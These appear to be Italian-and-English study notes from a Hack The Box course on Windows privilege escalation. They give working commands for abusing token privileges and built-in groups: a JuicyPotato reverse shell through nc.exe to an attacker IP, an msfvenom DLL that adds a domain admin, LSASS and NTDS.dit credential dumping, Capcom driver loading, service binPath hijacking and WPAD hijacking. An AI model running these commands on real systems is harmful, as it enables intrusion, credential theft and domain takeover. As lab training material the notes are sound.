# Introduzione

Solitamente lo scopo di fare privesc su windows e' arrivare a utente **Local Administrator** o **NT AUTHORITY\SYSTEM**.
COME CONNETTERSI AI LAB: **xfreerdp /v:<target ip> /u:htb-student**

## Useful Tools
| Tool                                     | Description                                                                                                                                                                                                       |
|------------------------------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| Seatbelt                                 | C# project for performing a wide variety of local privilege escalation checks                                                                                                                                   |
| winPEAS                                  | WinPEAS is a script that searches for possible paths to escalate privileges on Windows hosts. All of the checks are explained here                                                                              |
| PowerUp                                  | PowerShell script for finding common Windows privilege escalation vectors that rely on misconfigurations. It can also be used to exploit some of the issues found                                               |
| SharpUp                                  | C# version of PowerUp                                                                                                                                                                                           |
| JAWS                                     | PowerShell script for enumerating privilege escalation vectors written in PowerShell 2.0                                                                                                                       |
| SessionGopher                            | PowerShell tool that finds and decrypts saved session information for remote access tools. It extracts PuTTY, WinSCP, SuperPuTTY, FileZilla, and RDP saved session information                                   |
| Watson                                   | .NET tool designed to enumerate missing KBs and suggest exploits for Privilege Escalation vulnerabilities                                                                                                       |
| LaZagne                                  | Tool used for retrieving passwords stored on a local machine from web browsers, chat tools, databases, Git, email, memory dumps, PHP, sysadmin tools, wireless network configurations, internal Windows password storage mechanisms, and more |
| Windows Exploit Suggester - Next Generation (WES-NG) | Tool based on the output of Windows' systeminfo utility which provides the list of vulnerabilities the OS is vulnerable to, including any exploits for these vulnerabilities. Every Windows OS between Windows XP and Windows 10, including their Windows Server counterparts, is supported |
| Sysinternals Suite                       | Includes tools like AccessChk, PipeList, and PsService for enumeration                                                                                                                                           |

Solitamente e' sempre conveniente scrivere i file in `C:\Windows\Temp` perche' abbiamo permessi di scrittura.


# Situational Awareness

We should always look at routing tables to view information about the local network and networks around it. We can also gather information about the local domain (if the host is part of an Active Directory environment), including the IP addresses of domain controllers. It is also important to use the arp command to view the ARP cache for each interface and view other hosts the host has recently communicated with. This could help us with lateral movement after obtaining credentials. It could be a good indication of which hosts administrators are connecting to via RDP or WinRM from this host.

`C:\htb> ipconfig /all`

`C:\htb> arp -a`

`C:\htb> route print` routing table

`PS C:\htb> Get-MpComputerStatus`

`PS C:\htb> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections` list applocker rules
`PS C:\htb> Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone`

# Initial Enumeration

## Key points
- **OS Name** and **Version** sono utili per capire cosa dobbiamo cercare e se ci sono exploit pubblici.
- **Running Services**. E' importante vedere quali servizi runnano, soprattutto runnati da local administrator o NT AUTHORITY/SYSTEM.

## System Information
`C:\htb> tasklist /svc`, tasklist ritorna i processi in esecuzione.
E' importante diventare familiari con i processi standard di windows come SMSS.exe, CSRSS.exe, winlogon.exe LSASS.exe e svchost.exe. e' importante perche'
cosi' potremo spottare subito processi non standard e potenzialmente vulnerabili.

## Display ALl Environment Variables
il comando **set** per printarle.
La variabile piu' comune da vedere e' **PATH**, e molto spesso gli amministratori la modificano.

`C:\htb> set`, lista tutte le variabili d' ambiente.

## Detailed Configuration Information
il comando **systeminfo** mostra se la box e' stata patchata di recente. se non lo e' stata potremmo semplicemente runnare un known exploit.
Google the KBs installed under HotFixes to get an idea of when the box has been patched. 
The System Boot Time and OS Version can also be checked to get an idea of the patch level.

`C:\htb> systeminfo`

## Patches and Updates
Se systeminfo non mostra gli hotfixes possiamo vederli con **WMI**

`C:\htb> wmic qfe` mostra le laetst patch

`PS C:\htb> Get-HotFix | ft -AutoSize` anche questo

## Installed Programs
WMI si puo' usare anche per vedere i software installati
`C:\htb> wmic product get name`
`PS C:\htb> Get-WmiObject -Class Win32_Product |  select Name, Version`, con powershell

## Display Running Processes
`PS C:\htb> netstat -ano`

## User & Group information
### Logged-In Users
`C:\htb> query user`, per vedere gli utenti.
### Current User
`C:\htb> echo %USERNAME%`

### Current User Privileges
`C:\htb> whoami /priv`

### Current User Group Information
`C:\htb> whoami /groups`

### Get All Users
`C:\htb> net user`

### Get All Groups
`C:\htb> net localgroup`

### Deatils about a specific group
`C:\htb> net localgroup administrators`

### Password Policy and Other account info
`C:\htb> net accounts`


# Communication With Processes
Uno dei posti migliori per privesc e' guardare i processi che runnano nel sistema. Anche se non stanno runnando da amminstratore possono portare a privesc
tipo se si exploita un servizio con SeImpersonateToken.

## Access Tokens
Gli access token sono usati per descrivere il security context (attributi di sicurezza di un process o thread).
Il token include informazioni sull' identita' dell' utente e i privilegi specifici di quel processo o thread.
Quando un utente si autentica la password viene verificata contro un database, e se si autentica gli viene assegnato un access token. Ogni volta che l'utente interagisce con un process una copia di quel token viene presentata ed associata al processo.

## Enumerating Network Services

Il metodo piu' comune per interagire con i processi e' tramite network socket (DNS,HTTP,SMB etc.etc.). **netstat** mostra le connessioni TCP e UDP attive.
Potremmo trovare servizi vulnerabili.

`C:\htb> netstat -ano`.

La cosa principale da guardare sono le entry che ascoltano nei loopback addresses (**127.0.0.1** e **::\1**) che non stanno ascoltando sull' indirizzo IP della rete o sul broadcast(0.0.0.0, ::/0).
Spesso queste cose sono insicure perche' non sono accessibili dalla rete.

**Splunk Universal Forwarder** esempio di privesc.

**Erlang Port (25672)** porta spesso usata come vettore di privesc. 

## Named Pipes
Un altro modo in cui i processi comunicano tra loro sono le **Named Pipes**. Essenzialmente sono file storati in memoria che vengono ripuliti dopo essere stati letti.

Cobalt strike usa Named Piped per ogni comando. spesso pero' si usa la named pipe di un altro processo per mascherarsi.

ci sono due tipi di Pipe: **Named** e **Anonymous piped**.

Named pipes can communicate using half-duplex, or a one-way channel with the client only being able to write data to the server, or duplex, which is a two-way communication channel that allows the client to write data over the pipe, and the server to respond back with data over that pipe.

`C:\htb> pipelist.exe /accepteula` per listare le istance di Named Pipes, Pipelist e' della sysinternal suite

`PS C:\htb>  gci \\.\pipe\` con powershell.

After obtaining a listing of named pipes, we can use Accesschk to enumerate the permissions assigned to a specific named pipe by reviewing the Discretionary Access List (DACL), which shows us who has the permissions to modify, write, read, or execute a resource. Let's take a look at the LSASS process. We can also review the DACLs of all named pipes using the command .\accesschk.exe /accepteula \pipe\.

accesschk.exe /accepteula \pipe\.

`C:\htb> accesschk.exe /accepteula \\.\Pipe\lsass -v`

## Named Pipes Attack Example
Usando **accesschk** possiamo cercare tutte le named piped che ci danno permessi di scrittura

`accesschk.exe -w \pipe\* -v` comando per vedere le pipes con permessi di scrittura


# Windows Privilege Overview

## Windows Authorization Process
**Security Principals** sono qualsiasi cosa che puo' essere autenticata dal sistema operativo Windows.(computer, utenti, processi etc.etc.).

Ogni singolo Security Principal e' identificat da un unico **Security Identifier (SID)**, e appena creato un security principal gli viene assegnato il SID e gli rimane a vita.

Quando un utente prova ad accedere ad un oggetto (directory/file etc.etc.) tutte le info dell' utente come il suo SID, il SID dei gruppi di cui fa parte etc.etc. viene comparato con ogni entry della **Access Control Entries (ACEs)** finche' si trova un match e dopo si fa una decisione.


## Right and Privileges in Windows

| Group                        | Description                                                                                                                                                                                                                                                                                                  |
|------------------------------|--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| Default Administrators       | Domain Admins and Enterprise Admins are "super" groups.                                                                                                                                                                                                                                                     |
| Server Operators             | Members can modify services, access SMB shares, and backup files.                                                                                                                                                                                                                                           |
| Backup Operators             | Members are allowed to log onto DCs locally and should be considered Domain Admins. They can make shadow copies of the SAM/NTDS database, read the registry remotely, and access the file system on the DC via SMB. This group is sometimes added to the local Backup Operators group on non-DCs.              |
| Print Operators              | Members can log on to DCs locally and "trick" Windows into loading a malicious driver.                                                                                                                                                                                                                      |
| Hyper-V Administrators       | If there are virtual DCs, any virtualization admins, such as members of Hyper-V Administrators, should be considered Domain Admins.                                                                                                                                                                         |
| Account Operators            | Members can modify non-protected accounts and groups in the domain.                                                                                                                                                                                                                                         |
| Remote Desktop Users         | Members are not given any useful permissions by default but are often granted additional rights such as Allow Login Through Remote Desktop Services and can move laterally using the RDP protocol.                                                                                                           |
| Remote Management Users      | Members can log on to DCs with PSRemoting. This group is sometimes added to the local remote management group on non-DCs.                                                                                                                                                                                    |
| Group Policy Creator Owners  | Members can create new GPOs but would need to be delegated additional permissions to link GPOs to a container such as a domain or OU.                                                                                                                                                                        |
| Schema Admins                | Members can modify the Active Directory schema structure and backdoor any to-be-created Group/GPO by adding a compromised account to the default object ACL.                                                                                                                                                 |
| DNS Admins                   | Members can load a DLL on a DC, but do not have the necessary permissions to restart the DNS server. They can load a malicious DLL and wait for a reboot as a persistence mechanism. Loading a DLL will often result in the service crashing. A more reliable way to exploit this group is to create a WPAD record. |

## User rights assignment

| Setting Constant              | Setting Name                               | Standard Assignment                 | Description                                                                                                                                                                                                                                    |
|-------------------------------|--------------------------------------------|-------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| SeNetworkLogonRight           | Access this computer from the network     | Administrators, Authenticated Users | Determines which users can connect to the device from the network. This is required by network protocols such as SMB, NetBIOS, CIFS, and COM+.                                                                                                |
| SeRemoteInteractiveLogonRight | Allow log on through Remote Desktop Services | Administrators, Remote Desktop Users | Determines which users or groups can access the login screen of a remote device through a Remote Desktop Services connection. A user can establish a Remote Desktop Services connection but not log on to the console of the same server.         |
| SeBackupPrivilege             | Back up files and directories             | Administrators                      | Determines which users can bypass file and directory, registry, and other persistent object permissions for the purposes of backing up the system.                                                                                             |
| SeSecurityPrivilege           | Manage auditing and security log          | Administrators                      | Determines which users can specify object access audit options for individual resources such as files, Active Directory objects, and registry keys. These users can also view and clear the Security log in Event Viewer.                       |
| SeTakeOwnershipPrivilege      | Take ownership of files or other objects  | Administrators                      | Determines which users can take ownership of any securable object in the device, including Active Directory objects, NTFS files and folders, printers, registry keys, services, processes, and threads.                                         |
| SeDebugPrivilege              | Debug programs                            | Administrators                      | Determines which users can attach to or open any process, even a process they do not own. This user right provides access to sensitive and critical operating system components.                                                                |
| SeImpersonatePrivilege        | Impersonate a client after authentication | Administrators, Local Service, Network Service, Service | Determines which programs are allowed to impersonate a user or another specified account and act on behalf of the user.                                                                                                                       |
| SeLoadDriverPrivilege         | Load and unload device drivers            | Administrators                      | Determines which users can dynamically load and unload device drivers. This is not required if a signed driver already exists in the device's driver.cab file.                                                                                |
| SeRestorePrivilege            | Restore files and directories             | Administrators                      | Determines which users can bypass file, directory, registry, and other persistent object permissions when restoring backed-up files and directories. It also allows users to set valid security principals as the owner of an object.           |


Molti permessi sono visibili solo quando si runna una shell elevata. Questo concetto di elevazione dei privilegi e UAC si usa per limitare le azioni sensibli solo quando realmente necessarie.

Quando un privilegio compare come **disabled** significa che questo utente ha questo privilegio pero' non possiamo usarlo negli access token finche' non e' enabled.

Non esistono built-in commands per abilitare i privilegi disabled ma con un po' di scripting si puo' fare: https://www.powershellgallery.com/packages/PoshPrivilege/0.3.0.0/Content/Scripts%5CEnable-Privilege.ps1.

### Standard user rights
```
Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

### Backup operators rights
Questo gruppo ha anche altri privilegi che pero' UAC restringe.
```
Privilege Name                Description                    State
============================= ============================== ========
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```
### Detection
This post(https://blog.palantir.com/windows-privilege-abuse-auditing-detection-and-defense-3078a403d74e) is worth a read for more information on Windows privileges as well as detecting and preventing abuse, specifically by logging event 4672: Special privileges assigned to new logon which will generate an event if certain sensitive privileges are assigned to a new logon session. This can be fine-tuned in many ways, such as by monitoring privileges that should never be assigned or those that should only ever be assigned to specific accounts.


# SeImpersonate and SeAssignPrimaryToken
Ogni processo in windows ha un token assegnato che contiene informazioni sull' utente che l'ha runnato.

Se noi riusciamo a rubare un Token di SYSTEM e abbiamo il privilegio **SeImpersonate**(spesso posseduto da utenti di servizi) possiamo creare un processo con un token (con la Win32API **CreateProcessWithTokenW**).

**SeAssignPrimaryTokenPrivilege** serve invece per assegnare un token ad un processo . serve per eseguire **CreateProcessAsUser**

Alcuni programmi legittimi fanno cio' ovvero richiedono al processo SYSTEM **WinLogon** un token di SYSTEM e impersonano system per fare azioni privilegiate.

Questi sono i cosiddetti **potato style** attacks.

Exploiting juicy potato con una shell su mssql usando mssqlclient.py from the Impacket toolkit.
**-p** e' il processo da eseguire e **-a** gli argomenti:

`j4k1dibe@htb[/htb]$ mssqlclient.py sql_dev@10.129.43.30 -windows-auth`

`SQL> enable_xp_cmdshell`

`SQL> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *`

# SeDebugPrivilege

di default sono gli amministratori hanno questo privilegio ma viene assegnato a chiunque deve debuggare o fare troubleshooting.

possiamo usarlo per usare ProcDump e dumpare memoria di processi. Un processo molto utile da cui dumpare memoria e' lsass.exe che contiene le credenziali.

`C:\htb> procdump.exe -accepteula -ma lsass.exe lsass.dmp`.

This is successful, and we can load this in Mimikatz using the `sekurlsa::minidump` command. After issuing the `sekurlsa::logonPasswords` commands, we gain the NTLM hash of the local administrator account logged on locally. We can use this to perform a pass-the-hash attack to move laterally if the same local administrator password is used on one or multiple additional systems (common in large organizations).

Se abbiamo RDP possiamo dumparci la memoria a mano da **Task Manager > clicca sul processo > create dump file**.

Con SeDebugPrivilege si puo' anche prendere una **RCE** come SYSTEM(https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1).

con 612 PID di winlogon.exe che abbiamo ricavato con tasklist
![image](https://github.com/user-attachments/assets/acede22f-b517-40fe-b5a3-300b2a081c6f)


# SeTakeOwnership

Da' la possibilita' ad un utente di prendere il possesso di qualsiasi securable object.

Si puo' cambiare il **WRITE_OWNER**, quindi possiamo cambiare l' owner di un oggetto nel suo security descriptor.

E' Raro trovare utenti normali con questo privilegio ma non e' raro trovare servizi che ce l'hanno.

spesso si trova su servzi che sono tasked with running backup jobs and VSS snapshots assigned this privilege.

**SeRestorePrivilege**, and **SeSecurityPrivilege** to control this account's privileges at a more granular level and not granting the account full local admin rights.

These privileges on their own could likely be used to escalate privileges. Still, there may be times when we need to take ownership of specific files because other methods are blocked, or otherwise, do not work as expected. Abusing this privilege is a bit of an edge case. Still, it is worth understanding in-depth, especially since we may also find ourselves in a scenario in an Active Directory environment where we can assign this right to a specific user that we can control and leverage it to read a sensitive file on a file share.

The setting can be set in Group Policy under:

Computer Configuration ⇾ Windows Settings ⇾ Security Settings ⇾ Local Policies ⇾ User Rights Assignment

Si puo' sfruttare ad esempio con eseguibili come: https://github.com/FSecureLABS/SharpGPOAbuse 
![image](https://github.com/user-attachments/assets/87be223d-30dc-46b2-a2a1-a8e66f4c0ade)

## Leveraging the privilege

prima **abilitiamo i privilegi disabilitati**
```
PS C:\htb> Import-Module .\Enable-Privilege.ps1
PS C:\htb> .\EnableAllTokenPrivs.ps1
PS C:\htb> whoami /priv
```

Poi **scegliamo un target file**(che puo' anche essere in una share pubblic o privata)

poi **runniamo `takeown`**: `PS C:\htb> takeown /f 'C:\Department Shares\Private\IT\cred.txt'`

checkiamo che takeown ha funzionato: `PS C:\htb> Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}`

modifichiamo la **ACL** del file con **icacls**: `PS C:\htb> icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F` per darci permessi

**FILE INTERESSANTI DI CUI PRENDERE IL CONTROLLO**:
```
c:\inetpub\wwwwroot\web.config
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
```
We may also come across .kdbx KeePass database files, OneNote notebooks, files such as passwords.*, pass.*, creds.*, scripts, other configuration files, virtual hard drive files, and more that we can target to extract sensitive information from to elevate our privileges and further our access.


# Windows Built-in groups

I server windows e i Domain Controller hanno parecchi gruppi built-int di default, Vengono tutti da windows server 2008 tranne Hyper-V Administrators che e' stato aggiunto dopo.

- Backup Operators
- Event Log Readers
- DnsAdmins
- Hyper-V Administrators
- Print Operators
- Server Operators

## Backup Operators
Con `whoami /groups` possiamo vedere a quali gruppi apparteniamo.

Essere di questo gruppo ci da' **SeBackup** and **SeRestore** privileges.

**SeBackupPrivilege** ci da' il permesso di listare i contenuti di qualsiasi cartella e possiamo pure copiare un file (non con il classico comando copy).
we need to programmatically copy the data, making sure to specify the FILE_FLAG_BACKUP_SEMANTICS flag.

C'e' questa PoC per usare SeBackupPrivilege per copiare un file: https://github.com/giuliano108/SeBackupPrivilege.

Come copiare:
```
PS C:\htb> Import-Module .\SeBackupPrivilegeUtils.dll
PS C:\htb> Import-Module .\SeBackupPrivilegeCmdLets.dll
```
- importare le librerie
- Checkiamo se abbiamo i permessi SeBackupPrivilege
- Abilitiamo SeBackupPrivilege con `PS C:\htb> Set-SeBackupPrivilege`
- Copiamo il file con la PoC: `PS C:\htb> Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt`

## Attacking a Domain Controller - Copying NTDS.dit
Questo gruppo permette di loggarsi come Domain Controller.

NTDS.dit is a very attractive target, as it contains the NTLM hashes for all user and computer objects in the domain.

As the NTDS.dit file is locked by default, we can use the Windows diskshadow utility to create a shadow copy of the C drive and expose it as E drive. The NTDS.dit in this shadow copy won't be in use by the system.

![image](https://github.com/user-attachments/assets/0adc0ef2-723c-4341-9ef8-c914e1534916)

infine `PS C:\htb> Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit` per copiarcelo

## Backing up SAM and SYSTEM Registry Hives
The privilege also lets us back up the SAM and SYSTEM registry hives, which we can extract local account credentials offline using a tool such as Impacket's secretsdump.py

![image](https://github.com/user-attachments/assets/b603cf27-8028-4bce-920e-b907048d4441)

## Extracting Credentials from NTDS.dit

With the NTDS.dit extracted, we can use a tool such as **secretsdump.py** or the **PowerShell DSInternals** module to extract all Active Directory account credentials. Let's obtain the NTLM hash for just the administrator account for the domain using DSInternals.

```
PS C:\htb> Import-Module .\DSInternals.psd1
PS C:\htb> $key = Get-BootKey -SystemHivePath .\SYSTEM
PS C:\htb> Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
```

oppure

`j4k1dibe@htb[/htb]$ secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL`
E dopo vanno craccate offline con hashcat.

## Robocopy

Si puo' anche usare il built-in command per copiare i file in backup mode.

Robocopy differs from the copy command in that instead of just copying all files, it can check the destination directory and remove files no longer in the source directory. It can also compare files before copying to save time by not copying files that have not been changed since the last copy/backup job ran.

`C:\htb> robocopy /B E:\Windows\NTDS .\ntds ntds.dit`

# Event Log Readers

Alcuni admin potrebbero abilitare il logging dei comandi in shell per verificare l'esecuzione di comandi loschi tipo che il PC di un tizio della sezione marketing runna `tasklist`.


`C:\htb> net localgroup "Event Log Readers"` :vedere se e' presente il gruppo di Event Log reader

Possiamo fare query ai windows events con **wevutil**.

`PS C:\htb> wevtutil qe Security /rd:true /f:text | Select-String "/user"`
We can also specify alternate credentials for wevtutil using the parameters /u and /p.

`C:\htb> wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"`

Comunque per usare Get-WInEvent non basta essere nel gruppo EventLogReaders ma bisogna pure modificare questo registro: HKLM\System\CurrentControlSet\Services\Eventlog\Security.

### Searching security logs using Get-WinEvent
N.B. 4688 e' l'event ID che un processo e' stato creato.

`PS C:\htb> Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}`

The cmdlet can also be run as another user with the -Credential parameter.

# DnsAdmins

I membri di questo gruppo hanno accesso alle informazioni DNS sulla rete.

Il servizio DNS di windows permette l' uso di plugin per risolvere nomi che non sono nello sope delle zone DNS hostate localmente.
it is possible to use the built-in dnscmd utility to specify the path of the plugin DLL.

Tipicamente il server DNS gira come NT AUTHORITY\SYSTEM.

## Attacco al servizio DNS quando runna su Domain Controller
- DNS management is performed over RPC
- ServerLevelPluginDll allows us to load a custom DLL with zero verification of the DLL's path. This can be done with the dnscmd tool from the command line
- When a member of the DnsAdmins group runs the dnscmd command below, the HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll registry key is populated
- When the DNS service is restarted, the DLL in this path will be loaded (i.e., a network share that the Domain Controller's machine account can access)
- An attacker can load a custom DLL to obtain a reverse shell or even load a tool such as Mimikatz as a DLL to dump credentials.

## Leveraging DnsAdmins Access
1) Generating Malicious DLL:`j4k1dibe@htb[/htb]$ msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll`, una dll che esegue comando cmd per aggiungere un utente ai domain admins.
3) startiamo local http server
4) scarichiamo la dll malevola `PS C:\htb>  wget "http://10.10.14.3:7777/adduser.dll" -outfile "adduser.dll"`
5) carichiamo la Dll come utente DnsAdmin: `C:\htb> dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll`

N.B. quando specifichiamo la dll dobbiamo per forza mettere il PATH completo altrimenti non funziona.

Questo attacco si puo' fare solo come **DnsAdmin** perche' solo **DnsAdmins** hanno accesso al tool **dnscmd.exe**.

la DLL sara' caricata la prossima volta che il DNS verra' restartato, ma essere nel gruppo DnsAdmins non ci da' il permesso di restartare il servizio di DNS ma spesso i sysadmin ce lo danno.

### findinding User's SID

`C:\htb> wmic useraccount where name="netadm" get sid`

### Checking Permissions on DNS Service

`C:\htb> sc.exe sdshow DNS` 
RPWP permissions which translate to SERVICE_START and SERVICE_STOP, respectively.

### stopping the DNS service
`C:\htb> sc stop dns`

### starting the DNS service
`C:\htb> sc start dns`

### confirming group membership
`C:\htb> net group "Domain Admins" /dom`

## Cleaning up
Questo restartare servizi potrebbe essere distruttivo perche' butta giu' il server DNS di un intero dominio

### Confirming registry key addedd
prima checkiamo se effettivamente abbiamo aggiunto la reg key ServerLevelPluginDll
`C:\htb> reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters`

### Delete the reg key
`C:\htb> reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll`

### restarting DNS server
`C:\htb> sc.exe start dns`

### Checking DNS server status
`C:\htb> sc query dns`

## Usando Mimilib.dll
https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html

Per fare ste robe possiamo usare mimilib (dagli stessi creatori di mimikatz) andando a modificare il file kdns.c (https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kdns.c)

```
/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kdns.h"

DWORD WINAPI kdns_DnsPluginInitialize(PLUGIN_ALLOCATOR_FUNCTION pDnsAllocateFunction, PLUGIN_FREE_FUNCTION pDnsFreeFunction)
{
	return ERROR_SUCCESS;
}

DWORD WINAPI kdns_DnsPluginCleanup()
{
	return ERROR_SUCCESS;
}

DWORD WINAPI kdns_DnsPluginQuery(PSTR pszQueryName, WORD wQueryType, PSTR pszRecordOwnerName, PDB_RECORD *ppDnsRecordListHead)
{
	FILE * kdns_logfile;
#pragma warning(push)
#pragma warning(disable:4996)
	if(kdns_logfile = _wfopen(L"kiwidns.log", L"a"))
#pragma warning(pop)
	{
		klog(kdns_logfile, L"%S (%hu)\n", pszQueryName, wQueryType);
		fclose(kdns_logfile);
	    system("ENTER COMMAND HERE");
	}
	return ERROR_SUCCESS;
}
```

## Creating a WPAD Record

Un altro modo di abusare dei permessi di DnsAdmin e' creare un record WPAD. 

Membership in this group gives us the rights to disable global query block security, which by default blocks this attack. Server 2008 first introduced the ability to add to a global query block list on a DNS server. By default, Web Proxy Automatic Discovery Protocol (WPAD) and Intra-site Automatic Tunnel Addressing Protocol (ISATAP) are on the global query block list. These protocols are quite vulnerable to hijacking, and any domain user can create a computer object or DNS record containing those names.

After disabling the global query block list and creating a WPAD record, every machine running WPAD with default settings will have its traffic proxied through our attack machine. We could use a tool such as Responder or Inveigh to perform traffic spoofing, and attempt to capture password hashes and crack them offline or perform an SMBRelay attack.

### Disabling global Query block list
`C:\htb> Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local`

### Adding WPAD Record
`C:\htb> Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3`


# Hyper-V Administrators

The Hyper-V Administrators group has full access to all Hyper-V features. If Domain Controllers have been virtualized, then the virtualization admins should be considered Domain Admins.	

They could easily create a clone of the live Domain Controller and mount the virtual disk offline to obtain the NTDS.dit file and extract NTLM password hashes for all users in the domain.

It is also well documented on this blog(https://decoder.cloud/2020/01/20/from-hyper-v-admin-to-system/), that upon deleting a virtual machine, vmms.exe attempts to restore the original file permissions on the corresponding .vhdx file and does so as NT AUTHORITY\SYSTEM, without impersonating the user. We can delete the .vhdx file and create a native hard link to point this file to a protected SYSTEM file, which we will have full permissions to.

If the operating system is vulnerable to CVE-2018-0952 or CVE-2019-0841, we can leverage this to gain SYSTEM privileges. Otherwise, we can try to take advantage of an application on the server that has installed a service running in the context of SYSTEM, which is startable by unprivileged users.

Con questa PoC (https://raw.githubusercontent.com/decoder-it/Hyper-V-admin-EOP/master/hyperv-eop.ps1) possiamo prendere l' ownership di un file
e dopo con **takeown**.

`C:\htb> takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe`.

`C:\htb> sc.exe start MozillaMaintenance`
Note: This vector has been mitigated by the March 2020 Windows security updates, which changed behavior relating to hard links.

# Print Operators

**Print Operators** e' un gruppo con privilegi molto alti perche' hanno il permesso **SeLoadDriverPrivilege**.

It has  rights to manage, create, share, and delete printers connected to a Domain Controller, as well as the ability to log on locally to a Domain Controller and shut it dow.

**UACME**(https://github.com/hfiref0x/UACME) e' una repo con una lista di UAC bypasses utilizzabili da command line.

con questa PoC (https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp) possiamo abilitare il privilegio se disabilitato.

`C:\Users\mrb3n\Desktop\Print Operators>cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp` compiliamo la PoC

Adesso possiamo caricare driver vulnerabili tipo Capcom.sys (https://www.loldrivers.io/drivers/b51c441a-12c7-407d-9517-559cc0030cf6/)

Issue the commands below to add a reference to this driver under our HKEY_CURRENT_USER tree.
```
C:\htb> reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"

The operation completed successfully.


C:\htb> reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1

The operation completed successfully.
```
The odd syntax \??\ used to reference our malicious driver's ImagePath is an NT Object Path. The Win32 API will parse and resolve this path to properly locate and load our malicious driver.

Verificare se il driver c'e'.
```
PS C:\htb> .\DriverView.exe /stext drivers.txt
PS C:\htb> cat drivers.txt | Select-String -pattern Capcom
```

```
>sc create Capcom type= kernel binPath= C:\Users\user\Desktop\Capcom.sys
>sc start Capcom

>ExploitCapcom.exe
```

## Without GUI

Senza GUI si puo' fare ma dobbiamo cambiare del codice in ExploitCapcom.

If we do not have GUI access to the target, we will have to modify the ExploitCapcom.cpp code before compiling. Here we can edit line 292 and replace "C:\\Windows\\system32\\cmd.exe" with, say, a reverse shell binary created with msfvenom, for example: c:\ProgramData\revshell.exe.

Ci sono pure tool per caricare il driver:(https://github.com/TarlogicSecurity/EoPLoadDriver/)

`C:\htb> EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys`

## Cleanup
`C:\htb> reg delete HKCU\System\CurrentControlSet\Capcom`


# Server Operators Group

Il gruppo di Server Operator permette di gestire i Windows server senza l'assegnazione esplicita dei privilegi da Domain Admins.

E' un gruppo molto privilegiato che puo' loggare localmente sui server , inclusi i Domain Controllers.

Essere di questo gruppo ci fornisce i privilegi **SeBackupPrivilege and SeRestorePrivilege** e l' abilita' di controllare i servizi locali.

Dato che possiamo controllare i servizi locali. possiamo prendere un servizio di SYSTEM e modificarne il binPath e restartarlo.
Facciamo con il servizio AppReadiness.

`C:\htb> sc qc AppReadiness` Per verificare che SYSTEM e' l'owner

`C:\htb> c:\Tools\PsService.exe security AppReadiness` controlliamo che effettivamente abbiamo tutti i permessi sui servizi locali

`C:\htb> net localgroup Administrators` controlliamo che non siamo admin

`C:\htb> sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"` modifichiamo il binPath e ci aggiungiamo ai local Administrators

`C:\htb> sc start AppReadiness`. startiamo il servizio.

`C:\htb> net localgroup Administrators` confermiamo che siamo local admin.

## Confirming Local admin and Domain controller access
Ora abbiamo controllo totale sul domain controller e possiamo prendere tutte le credenziali dal database NTDS.
`j4k1dibe@htb[/htb]$ crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'`

## Retrieving NTLM hashes from Domain Controllers
